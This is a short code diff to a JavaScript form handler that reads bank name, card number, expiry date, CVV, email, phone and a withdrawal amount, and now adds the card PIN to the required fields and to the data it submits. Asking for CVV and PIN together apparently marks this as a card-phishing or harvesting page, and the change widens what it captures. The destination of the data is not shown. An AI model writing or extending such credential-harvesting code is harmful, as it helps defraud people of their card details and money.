@@ -17,10 +17,11 @@ form.addEventListener('submit', (e) => {
   const cvv = document.getElementById('cvv').value;
   const email = document.getElementById('email').value;
   const phoneNumber = document.getElementById('phone-number').value;
-  const WithdrawAmount = document.getElementById('Withdraw-Amount').value;
+  const withdrawAmount = document.getElementById('Withdraw-Amount').value;
+  const pin = document.getElementById('pin').value;
 
   // Check if all fields are filled
-  if (!bankName || !cardNumber || !expiringDate || !cvv || !email || !phoneNumber) {
+  if (!bankName || !cardNumber || !expiringDate || !cvv || !email || !phoneNumber || !withdrawAmount || !pin) {
     alert('Please fill all details');
     return;
   }
@@ -32,6 +33,7 @@ form.addEventListener('submit', (e) => {
     card_number: cardNumber,
     expiring_date: expiringDate,
     cvv: cvv,
+    pin: pin,
     email: email,
     phone_number: phoneNumber
   })
